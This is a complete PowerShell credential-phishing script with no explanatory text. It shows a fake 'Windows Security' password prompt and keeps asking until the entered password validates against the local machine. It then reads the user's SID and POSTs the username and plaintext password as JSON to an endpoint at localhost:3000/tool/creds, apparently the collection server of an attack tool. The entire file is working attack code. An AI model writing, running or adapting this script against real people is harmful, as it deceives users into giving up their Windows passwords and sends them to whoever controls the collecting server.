function Prompt{
    $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    while($DS.ValidateCredentials("$full", "$password") -ne $True){
        $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
        $username = "$env:username"
        $domain = "$env:userdomain"
        $full = "$domain" + "\" + "$username"
        $password = $cred.GetNetworkCredential().password
        Add-Type -assemblyname System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
        $DS.ValidateCredentials("$full", "$password") | out-null
     }
     $username=$env:username
     $user = New-Object System.Security.Principal.NTAccount($username)
     $sid = $user.Translate([System.Security.Principal.SecurityIdentifier]).Value
     $username = $cred.GetNetworkCredential().UserName;
     $password = $cred.GetNetworkCredential().password;
     $response = $username+'\n'+$password
     $params = @{
        sid=$sid;
        response=$response;}
    $json = $params | ConvertTo-Json
    Invoke-WebRequest -Uri https://localhost:3000/tool/creds -Method POST -Body $json -ContentType "application/json"
    exit;
}
Prompt